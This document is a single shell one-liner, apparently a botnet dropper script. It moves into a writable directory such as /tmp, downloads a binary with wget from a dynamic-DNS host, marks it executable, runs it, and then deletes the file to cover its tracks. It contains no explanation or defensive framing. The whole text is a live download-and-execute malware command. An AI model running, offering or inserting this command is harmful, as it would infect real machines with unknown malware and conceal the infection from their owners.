cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://gaming324.ddns.net/opengglsssssss; chmod +x opengglsssssss; ./opengglsssssss; rm -rf opengglsssssss
